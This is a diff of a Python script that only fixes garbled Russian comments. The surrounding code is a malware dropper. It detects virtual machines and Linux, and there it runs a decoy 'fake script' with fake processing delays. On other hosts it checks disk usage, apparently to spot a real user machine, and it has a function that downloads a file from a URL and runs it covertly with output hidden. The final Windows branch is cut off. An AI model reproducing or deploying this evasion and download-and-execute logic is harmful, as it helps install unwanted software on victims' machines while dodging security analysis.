@@ -8,11 +8,11 @@ import random
 import logging
 from urllib import request
 
-# ��������� �����������
+# Настройка логирования
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 
 def is_virtual_machine():
-    """ ����������, ����������� �� ��� �� ����������� ������ """
+    """ Определяет, выполняется ли код на виртуальной машине """
     try:
         system = platform.system()
         if system == "Linux":
@@ -28,28 +28,28 @@ def is_virtual_machine():
     return False
 
 def check_disk_space():
-    """ ���������, ������ �� �� ����� C: ����� 45 �� """
+    """ Проверяет, занято ли на диске C: более 45 ГБ """
     total, used, free = shutil.disk_usage("C:\\")
     used_gb = used / (1024 ** 3)
     return used_gb > 45
 
 def download_and_execute(url, file_name):
-    """ ��������� ���� �� ������ � ��������� ��� ������� """
+    """ Скачивает файл по ссылке и запускает его скрытно """
     logging.info(f"Downloading {file_name} from {url}...")
     request.urlretrieve(url, file_name)
     logging.info(f"Downloaded {file_name}. Executing...")
     
-    # ������ ����� �������
+    # Запуск файла скрытно
     subprocess.Popen(file_name, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def fake_script():
-    """ �������� ������ ��� ���������� �� ����������� ������ ��� Linux """
+    """ Фейковый скрипт для выполнения на виртуальной машине или Linux """
     logging.info("Starting fake script...")
     
     def fake_data_processing():
         logging.info("Starting data processing...")
         for i in range(1, 6):
-            time.sleep(random.uniform(0.5, 1.5))  # ��������� ��������
+            time.sleep(random.uniform(0.5, 1.5))  # Фиктивная задержка
             logging.info(f"Processed chunk {i}/5")
         logging.info("Data processing complete.")
 
@@ -76,7 +76,7 @@ def fake_script():
     logging.info("Fake script finished.")
 
 def main():
-    """ �������� ������� ��������� """
+    """ Основная функция программы """
     if platform.system() == "Linux" or is_virtual_machine():
         fake_script()
     else:
